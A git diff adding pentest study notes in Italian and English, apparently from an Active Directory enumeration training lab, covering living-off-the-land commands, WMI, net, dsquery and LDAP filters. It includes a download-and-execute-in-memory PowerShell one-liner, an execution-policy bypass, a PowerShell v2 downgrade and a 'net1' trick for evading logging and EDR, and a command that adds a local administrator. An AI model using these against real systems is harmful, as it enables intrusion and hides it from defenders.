@@ -597,3 +597,175 @@ Spesso ci sono tanti local admins non necessari, cerchiamoli su bloodhound
 
 
 This query shows two hosts, one running Windows 7 and one running Windows Server 2008 (both of which are not "live" in our lab). Sometimes we will see hosts that are no longer powered on but still appear as records in AD. We should always validate whether they are "live" or not before making recommendations in our reports. We may write up a high-risk finding for Legacy Operating Systems or a best practice recommendation for cleaning up old records in AD.
+
+
+# Living Off The Land
+
+## Basic Enumeration Commands
+
+| Command                                       | Result                                                 |
+|-----------------------------------------------|--------------------------------------------------------|
+| `hostname`                                    | Prints the PC's Name                                  |
+| `[System.Environment]::OSVersion.Version`     | Prints out the OS version and revision level         |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host |
+| `ipconfig /all`                               | Prints out network adapter state and configurations  |
+| `set`                                         | Displays a list of environment variables for the current session (ran from CMD-prompt) |
+| `echo %USERDOMAIN%`                           | Displays the domain name to which the host belongs (ran from CMD-prompt) |
+| `echo %logonserver%`                          | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
+
+
+### Systeminfo
+`systeminfo`, ritorna parecchie informazioni, utili ad esempio per trovare CVE
+
+
+## With Powershell
+
+## PowerShell Enumeration Commands
+
+| Cmd-Let | Description |
+|---------|------------|
+| `Get-Module` | Lists available modules loaded for use. |
+| `Get-ExecutionPolicy -List` | Prints the execution policy settings for each scope on a host. |
+| `Set-ExecutionPolicy Bypass -Scope Process` | Changes the policy for the current process using the `-Scope` parameter. This reverts once the process terminates, avoiding permanent changes to the victim host. |
+| `Get-ChildItem Env: | ft Key,Value` | Returns environment values such as key paths, users, computer information, etc. |
+| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Retrieves the specified user's PowerShell history, which may contain passwords or useful configuration details. |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | A quick method to download and execute a file from the web directly in memory. |
+
+## DownGrade Powershell
+
+spesso esistono piu' versioni di powershell sullo stesso host e magari l'admin non lo sapeva. Puo' tornare utile per ragioni di stealth. Tra l'altro Powershell versioni dopo la 3 ha inserito event logging. Percio' la versione 2 e' molto piu' stealth.
+
+`PS C:\htb> powershell.exe -version 2`, downgrade a powershell v2
+
+
+### Check Defenses
+
+### Check pdel firewall
+`PS C:\htb> netsh advfirewall show allprofiles`
+
+### Check di windows defender dal cmd.exe
+`C:\htb> sc query windefend`
+
+### Check di defender da powershell
+`PS C:\htb> Get-MpComputerStatus`
+
+
+### Enum logged on
+utile perche' magari potremmo causare sospetti se c'e' anche qualcun altro loggato
+`PS C:\htb> qwinsta`
+
+
+### Network Information
+
+| Networking Commands | Description |
+|--------------------|-------------|
+| `arp -a` | Lists all known hosts stored in the ARP table. |
+| `ipconfig /all` | Prints out adapter settings for the host. Helps determine the network segment. |
+| `route print` | Displays the routing table (IPv4 & IPv6), identifying known networks and shared layer three routes. |
+| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall, indicating if it is active and filtering traffic. |
+
+
+## Windows Managemen Instrumentation (WMI)
+E; uno scripting engine molto usato in Windows enterprise environments
+
+### Quick WMI Checks
+
+| Command | Description |
+|---------|-------------|
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patch level and description of the Hotfixes applied. |
+| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information, including attributes within the list. |
+| `wmic process list /format:list` | Lists all processes running on the host. |
+| `wmic ntdomain list /format:list` | Displays information about the Domain and Domain Controllers. |
+| `wmic useraccount list /format:list` | Displays information about all local accounts and any domain accounts that have logged into the device. |
+| `wmic group list /format:list` | Provides information about all local groups. |
+| `wmic sysaccount list /format:list` | Dumps information about any system accounts being used as service accounts. |
+
+
+## Net Commands
+
+Il comando net e' molto utile per enumerare un sacco di cose. Pero' net.exe e' molto spesso monitorato da quegli infami degli EDR
+
+
+## Table of Useful Net Commands
+
+| Command | Description |
+|---------|-------------|
+| `net accounts` | Information about password requirements. |
+| `net accounts /domain` | Displays password and lockout policy. |
+| `net group /domain` | Information about domain groups. |
+| `net group "Domain Admins" /domain` | Lists users with domain admin privileges. |
+| `net group "domain computers" /domain` | Lists PCs connected to the domain. |
+| `net group "Domain Controllers" /domain` | Lists PC accounts of domain controllers. |
+| `net group <domain_group_name> /domain` | Displays users that belong to the specified group. |
+| `net groups /domain` | Lists all domain groups. |
+| `net localgroup` | Displays all available groups. |
+| `net localgroup administrators /domain` | Lists users in the administrators group inside the domain (includes "Domain Admins" by default). |
+| `net localgroup Administrators` | Displays information about the "Administrators" group. |
+| `net localgroup administrators [username] /add` | Adds a user to the administrators group. |
+| `net share` | Checks current shared folders. |
+| `net user <ACCOUNT_NAME> /domain` | Retrieves information about a user within the domain. |
+| `net user /domain` | Lists all users of the domain. |
+| `net user %username%` | Displays information about the current user. |
+| `net use x: \\computer\share` | Mounts the specified share locally. |
+| `net view` | Gets a list of computers in the network. |
+| `net view /all /domain[:domainname]` | Displays all shares on the domain. |
+| `net view \\computer /ALL` | Lists shares of a specific computer. |
+| `net view /domain` | Lists all PCs in the domain. |
+
+### Net1 trick
+Se pensi che gli EDR/defender ti srta monitorando puoi provare a usare **net1** che e' identico, potenzialmente bypassando quel check,
+
+
+## DSQuery
+E' un command line tool utilizzato per trovare oggetti in un AD. Le query sono tipo quelle di BloodHound o PowerView ed e' preinstallato in tutti i sistemi windows.
+
+### User search
+`PS C:\htb> dsquery user`
+
+### COmputer search
+`PS C:\htb> dsquery computer`
+
+### Wildcard search
+`PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"`
+
+### User con Set di attributi specifico ((PASSWD_NOTREQD))
+`PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl`
+
+
+### Searching Domain Controllers
+`PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName`
+
+## LDAP Filtering explained
+incontriamo spesso stringhe del genere: **userAccountControl:1.2.840.113556.1.4.803:=8192.**. Significa che stiamo cercando nel UAC per un OID.
+
+
+La prima parte **userAccountControl:1.2.840.113556.1.4.803:** indica che stiamo cercando dell' UAC invece **=8192** e' l' OID che stiamo cercando.
+
+
+## OID match strings
+
+OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:
+
+    1.2.840.113556.1.4.803
+
+When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.
+
+    1.2.840.113556.1.4.804
+
+When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.
+
+    1.2.840.113556.1.4.1941
+
+This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.
+
+## Logical Operators
+
+When building out search strings, we can utilize logical operators to combine values for the search. The operators & | and ! are used for this purpose. For example we can combine multiple search criteria with the & (and) operator like so:
+(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
+
+The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like (&(1) (2) (3)). The ! (not) and | (or) operators can work similarly. For example, our filter above can be modified as follows:
+(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
+
+This would search for any user object that does NOT have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.
+
+A lot can be done with UAC filters, operators, and attribute matching with OID rules. For now, this general explanation should be sufficient to cover this module. For more information and a deeper dive into using this type of filter searching, see the Active Directory LDAP module.
